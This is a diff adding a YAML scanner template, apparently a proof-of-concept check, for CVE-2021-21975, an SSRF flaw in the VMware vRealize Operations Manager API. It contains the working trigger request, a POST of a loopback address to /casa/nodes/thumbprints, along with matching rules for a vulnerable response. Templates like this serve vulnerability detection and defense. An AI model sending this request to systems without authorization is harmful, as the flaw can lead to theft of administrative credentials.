@@ -1,0 +1,26 @@
+name: VMWare_Operations_vRealize_Operations_Manager_API_SSRF_CVE_2021_21975
+transport: http
+set: {}
+detail:
+  dock: app="Apache-Web-Server" && title="vRealize Operations Manager"
+  product: VMWare Operations vRealize Operations
+  homepage: https://www.vmware.com/products/vrealize-operations.html
+  impact: Server Side Request Forgery in vRealize Operations Manager API (CVE-2021-21975)
+    prior to 8.4 may allow a malicious actor with network access to the vRealize Operations
+    Manager API can perform a Server Side Request Forgery attack to steal administrative
+    credentials.
+  description: vRealize Operations Enable self-driving IT Operations Management across
+    private, hybrid and multi-cloud environments with a unified operations platform
+    that delivers continuous performance, capacity and cost optimization, intelligent
+    remediation and integrated compliance through AI/ML and predictive analytics.
+rules:
+  r1:
+    method: POST
+    path: /casa/nodes/thumbprints
+    follow_redirects: false
+    headers:
+      Content-Type: application/json;charset=UTF-8
+    body: '["127.0.0.1:443"]'
+    expression: response.status == 200 && !response.body.bcontains(b'error_message') &&
+      response.body.bcontains(b'thumbprint') && response.body.bcontains(b'address')
+expression: r1()
